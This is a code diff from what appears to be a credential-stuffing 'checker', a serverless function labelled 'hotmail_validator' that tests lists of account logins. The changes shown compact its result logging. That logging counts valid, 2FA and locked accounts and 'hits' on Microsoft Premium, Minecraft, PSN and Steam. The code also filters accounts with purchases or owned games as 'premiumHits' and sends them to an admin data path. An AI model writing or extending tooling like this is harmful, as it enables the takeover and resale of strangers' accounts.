     console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
-    console.log(`${getCanaryTimestamp()} SESSION COMPLETE`);
-    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
-    console.log(`${getCanaryTimestamp()} Duration: ${sessionInfo.duration}`);
-    console.log(`${getCanaryTimestamp()} Processed: ${accounts.length} accounts`);
-    console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} (${successRate}%)`);
-    console.log(`${getCanaryTimestamp()} Invalid: ${stats.invalid}`);
-    console.log(`${getCanaryTimestamp()} 2FA: ${stats.twoFa}`);
-    console.log(`${getCanaryTimestamp()} Locked: ${stats.locked}`);
-    console.log(`${getCanaryTimestamp()} MS Premium: ${stats.msPremium}`);
-    console.log(`${getCanaryTimestamp()} Minecraft: ${stats.minecraftHits}`);
-    console.log(`${getCanaryTimestamp()} PSN: ${stats.psnHits}`);
-    console.log(`${getCanaryTimestamp()} Steam: ${stats.steamHits}`);
+    console.log(`${getCanaryTimestamp()} SESSION COMPLETE | Duration: ${sessionInfo.duration}`);
+    console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} (${successRate}%) | Invalid: ${stats.invalid} | 2FA: ${stats.twoFa} | Locked: ${stats.locked}`);
+    console.log(`${getCanaryTimestamp()} MS Premium: ${stats.msPremium} | Minecraft: ${stats.minecraftHits} | PSN: ${stats.psnHits} | Steam: ${stats.steamHits}`);
     console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
 
-    // Save history to Firebase if user is authenticated
-    // Save to Firebase - using correct paths per Firebase rules
     if (userId && saveHistory) {
       EdgeRuntime.waitUntil(firebasePush(`checkHistory/${userId}`, {
         service: "hotmail_validator",
@@ -1059,7 +892,6 @@ serve(async (req) => {
         createdAt: new Date().toISOString()
       }));
 
-      // Push live hits to adminData (admin only path per Firebase rules)
       const premiumHits = allResults.filter(r => 
         r.status === 'valid' && (r.msStatus === 'PREMIUM' || r.psn?.status === 'HAS_ORDERS' || r.steam?.status === 'HAS_PURCHASES' || r.minecraft?.status === 'OWNED')
       );
